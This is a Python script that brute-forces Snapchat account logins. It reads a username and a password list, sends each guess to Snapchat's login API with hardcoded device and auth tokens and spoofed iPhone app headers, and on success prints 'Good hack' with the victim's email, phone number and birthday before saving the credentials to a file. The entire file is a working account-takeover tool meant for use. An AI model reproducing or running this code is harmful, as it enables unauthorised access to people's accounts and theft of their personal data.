import requests
import json
r = requests.session()
green_color = "\033[1;32m"
red_color = "\033[1;31m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"

print(detect_color+ """

                                                          
,pP"Ybd `7MMpMMMb.   ,6"Yb. `7MMpdMAo.  ,pP""Yq.`7M'   `MF'
8I   `"   MM    MM  8)   MM   MM   `Wb 6W'    `Wb `VA ,V'
`YMMMa.   MM    MM   ,pm9MM   MM    M8 8M      M8   XMX
L.   I8   MM    MM  8M   MM   MM   ,AP YA.    ,A9 ,V' VA.
M9mmmP' .JMML  JMML.`Moo9^Yo. MMbmmd'   `Ybmmd9'.AM.   .MA.
                              MM
                            .JMML.

    """)
    
print(banner_color+'Photon runs only on Python 3.2 and above')
print(banner_color+"0xfff0800 - FaLaH                       ")
print(end_banner_color+'__________________________________________________')
print(end_banner_color+"")
user = input("Usernames => ")
flo = input("List Of Passwords => ")

url = "https://gcp.api.snapchat.com/scauth/login"

password = open(flo).read().splitlines()

for password in password:
      payload = "device_check_token=AgAAANkQzaFTNlFir5XtxDvyMd4EUNk0%2Bme89vLfv5ZingpyOOkgXXXyjPzYTzWmWSu%2BBYqcD47byirLZ%2B%2B3dJccpF99hWppT7G5xAuU%2By56WpSYsARu2yP6ogZAncqwpzj8JH4Tqvtw5Vnp8nlXxTpeyCIfEGhms2jFNS3xFp7aEz7twzR09V2GyRYGQhnWEVIeGFdB3gcAACzii3Vs4LjxipQ%2FhZ5uBDx7oQnGRqx5AQy9KEB0FKxyJXfN5McqIL%2BRhthve4Pi2z3xITHdQ%2BL9sMTQALVX12hLmVMztFp6%2FV1BlEs4RcMVylzloYqCm7T8%2Bvnc1UFl%2BxUUXWwf3Ga3iwtq9elvTzUqyo1tP453rP0rXfPRZXP1QmwfllHpbcMi7RpKoJur4cYKiHXNmgEVSmMKpDhA6RCPaOb8dQZwBBnvhtLwYlHRGRq1DQim%2FNtFG4%2FwIRiwXObLV8ElAEnDJsdbllvyuKcg%2F9ClRWOldxOGb8y8pPPgw4IfQtkhh0rTSODTw37K21yt%2B%2FCVnwc87yUC2wJI%2BqbZPCDVCzzpF8teu%2BT4hWVAzo08v8tgMQH9qkYq6NI2o%2Blv4DCg%2FDov6K9ZrKZppCkaFNEzh5FIwGEKNcQ3zRKfFlkHr3io6ZhsjkOLWiBGKuloo%2BoRLiJu6izPQ6qkG%2BZ9SnSEKCXDnGs8IwuMfOmZlzhtduekyRjODtvhsKraXsl13%2BYfRdr1ZgBY6%2BBdC2b0xqbiMEbM4AC8d8Pc0tzFRfy%2BJXe3dZlNyX7ZagP6%2BQczhuAyjEY2KrwM6QxbvKueRNoshblK90CUwwf1I3ZCuAfMuWJPbptnZfNW7dOxne%2BG%2FpguW3HzWYDCODDg30AH%2FnyxTNHWBhab5p%2FJO1keNzMisBpAI6qNYzdJ0yMpcqDGXohPsHAlmfjAnsY2c%2FAHDx5TKyHiWsOWwmBFQ3dgHJdlZHUHsBwM3nYm9j9qojDUUlzDAFJHZew%2FlsKEgUOzWOdX9NUVfVx0tcoolfB4pB70qJ20VTsSP4SYHn9m29eHwwGhvpU%2FbVhZLClPaVGmb212fPIQA4t3YyVhwXW1uUIxDOdBmYO67kT2ykBsOBso%2FYDWev3Wnnx9eSNEBjrnrM9b1eXWgG2k4LeJnfI65GuHZoEkZY7%2Fy%2BrR6eO48ayTXTu0nuEUDYPZKcE2ccUcLiJfSfvgBhupcSJaNbbvW1gsbd1YknMgdSLPO5TDXLPuMlmmneq%2BPzgnQqSo8CP%2FUlzHIOLxaZSBFTxHDvzAC1fnJdZxGOz705rFR6t2fz6mO0y11UMsh1Rd7dM%2B5aAcsqiKNkvDWySOZS5%2BLJI%2Fk3gDgGBrsGR%2BjfFIPrBY1CPSrW6InSlBl5mOeG9WYAYBQWSaCXM3oSGNvlUr6FeIwWlOMcUfhkMZ3m%2FqWk3hEL9W33GrRGnZC%2BrzxD1wkuQBE3TByAyzqUO2t%2Ffq716vDjbHdNo%2BuavjURi%2FV5Aioz3k6mue6oU%2BRUaIVxWv3BRo3OBw%2B51CUNJyAumiCnpXdS6csltSiVBYkY1qXHQhIUqsRlj6sfYSmWJhrirQTxwW%2FEFFw84H5%2FuhgdNtn6phfv13UmMNL1ERVa4i6p1Mt2RT2k24uvcx47VFjLnHkYZ8I6F1FAAM5V3ATnQLke7OYyalB%2BJe45b2FO9moGpVUlsGYGaMXMvmT6MQdUJ%2F4RjVrfh37HJeuIEt%2Fh5EvTWn5OiD%2B2uUE%2BvmNVX1gTj%2BVKfXVfgbuFFgltfrkniL4GUSizay3pGz%2FtFATNtbv14BcclOAa8EvEGCorcLVoseD8rU0SNoRTNqspVV1Up8IXZnUlxlUPkJuSJejwcCyQsH3RWjR1tjSBYoZnNeP8CT5gnr3Sg5wRnJ22QGse%2F6YfNxcKg5Wt0M8hGhw0pY1k2moCHNSSp9jQ94v0ql4PQDfbEF71Cy4uQB454to%2FzicoJUugh7gFGJFTwZlYDty7R53h%2BOGL7QAvmLjjOl0pn2cxDHZRgA4nhZtj1yNDMslcHwWGWEKJl7OJKy8uFosPNW8aNKcxDlSMMpYKtGDEhM92lFzMp%2Bnn6o%2BkHwai9lqqx%2BoI5SNHABpX1aetIhM0ZC1StwZKtkiecTyIuB%2BCChW8i1%2FqrN1iG3cTGdwWyAWKUe%2B0zNSW0Me9Fhu3zBJqJsbQFsOgjYoY%2BVxHkfwiAczVGK6Fx0PJrvi1V6NY78DyzmR33kNE3JK7GRxWPntk9xenFJtCbnbp1Ce1yQG20hGjSSthGrigpeY2gJJq1btu09Cdl1VG5srRGjRJgXuN%2BaavbcE4AFrez0h%2F3oFcwPAs9B9dBlRaoAy46Php2Q%2FhUz5H5SoSlQPZ2VY%2BiFS%2Fy629e6aDuB9PP5%2F4jdXilZBQQQZ8WkunL8kQlCFx3%2BgmoPMkvJx2S1HTRl%2BcZWQDMNRTvkQovUIfM%2FRjFU7B6JHRgkm2xuilGa1hyfrqOkC1ZYtBvROyPF5qJXvEc%2B9Vak5cFDHmcwW7gTPT3VGFuAHiw2ibgBjxK%2Fqz4SnqRkVpBvqJSTb8zC7R9graG%2FBXaz2lK1ku8x%2FwPlsEJ8AH1hTxo9uW8X%2FAKwbhBjot%2B%2BEuR9%2FhB6OM3%2BoRTrZ%2ByuhwRHw9gFCfnFwvpqEyvmPXTk8%2FgTOvJAVvTqjls2qJ1IFLHWZCKxWbGrMXDW6vGcTqHInihfEUNmJ1ROLG%2B%2FkUnX6JSaUKpzbNPW75ktTgyPtXl95QX8cA3hWf%2FG9W%2FmfQUPvFDVrglaqF0WKVFGj%2BgM4ku3Y3yeZPtkPHq%2F9DeRjsR7ecxUGaVfHTn3elsjOTajSrT4Cs0K%2Fxym9lOpT0GGU7KfUQpgSXGKe0e0bsoxPNmIa78kTghn6CDlqouXkkmOXy%2BSV9q75nfYSNcvZfw%3D&device_id=673379&dsig=77A72FE68EB933B03F31&dtoken1i=00001%3AZAnUXMn2RBGhORz8rDNlso6tk5XYSkVc9HUAN0PLlHtZ44fnBE4%2BDF1mSU6oC5Hh&fidelius_client_init=%7B%22new_fidelius_version%22%3A9%2C%22hashed_out_betas%22%3A[%22tTnai7fX%2B6Pu70FX9XGU5j0JpGzkiYNg6y2ZNsmnam0%3D%22%2C%22BrR65Fgk4PaEoOBFp1RJz2e8%2FCJNvCm1dQmFstnX%2Bc0%3D%22%2C%22xLofTYJ2muIARX9yyvBOmYZ5sZX6%2FlSSPTiVjrwqurs%3D%22]%2C%22new_hashed_out_beta%22%3A%22tTnai7fX%2B6Pu70FX9XGU5j0JpGzkiYNg6y2ZNsmnam0%3D%22%2C%22new_iwek%22%3A%22A1qZoWLHO6xTIYwrlZ2GE5KUPKWI7TKUmRu1mc86YBM%3D%22%2C%22new_out_beta%22%3A%22MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEJtOze%2F94MOtJ3bibvrSHlCr1Ca5hpuaTFNqMM1NVLIR6EIpGbgAauDPyXHr3eHJSFKDTFgHAikowG7bFPWA3gQ%3D%3D%22%7D&from_deeplink=false&height=1334&odlv_pre_auth_token=&password="+password+"&pre_auth_token=&reactivation_confirmed=false&remember_device=true&req_token=93019054af01a2286eb03ae8f4a938a48aed4d8d193daa85e9b42b14d4c51a6b&screen_height_in=0&screen_height_px=667&screen_width_in=0&screen_width_px=375&timestamp=1624121132757&username="+user+"&width=750"
      headers = {
    "X-Snapchat-Uuid": "2A50CB6A-3331-4870-8CDD-A54AAAE7760D",
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "User-Agent": "Snapchat/10.81.0.71 (iPhone9,3; iOS 14.4.1; gzip)",
    "Accept": "application/json",
    "X-Snapchat-Client-Auth-Token": "v8:8286DABBD850AD978BEFA39734EB9517:8C2CACF1237C19763BE4A2CD387F3968EBB2C7C7A787CB569B8E8C9682D964FA2DE8AC400EBEC2197604B9E2E45915A73EA40C647C214141A6840ED20DA4ECEC7EE6796FE264B6E43C83C1ACA1F5BC0E864D3FF56080DA0E89F5521552D884A26F9953968B6044ADE50DB11082653571EBDE681B429323BE2EAE5FCEEA2BF1ABE58D21CBCE8A287A27AF14FDCC7885E220E92BA3375FF2D3DC287C4E8E6022FED911DDC7DA299A943A6ED3B69A6723285FB3764F79DAE58CF77596055421735F440607B9D466DE4DA46A5945F097D912C6F4A127C834143FD01F2DC70F3E02D92AA1558114402A46A8AB9BAA5AB47279D78EBE95D77F3466AA95B06CA4ED2EF839D7962BCEF8F32522F2797EE96380CA8FA77AF63B6BC41296A58D094CDB12C4",
    "Host": "gcp.api.snapchat.com"
}

      response = r.post(url, data=payload , headers=headers).text
      info = json.loads(response)


      if 'updates_response' in response:
                print(red_color+"---------------------------------------")
                print((green_color + 'username : ' + user + ' | password : ' + password + ' --> Good hack '))
                print(green_color +" --> Email : "+str(info["updates_response"]["email"]))
                print(green_color +" --> mobile : "+str(info["updates_response"]["mobile"]))
                print(green_color +" --> birthday : "+str(info["updates_response"]["birthday"]))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
      elif 'logged' in response:
                print(red_color+"---------------------------------------")
                print((red_color + '' + user + ':' + password + ' --> Error '))
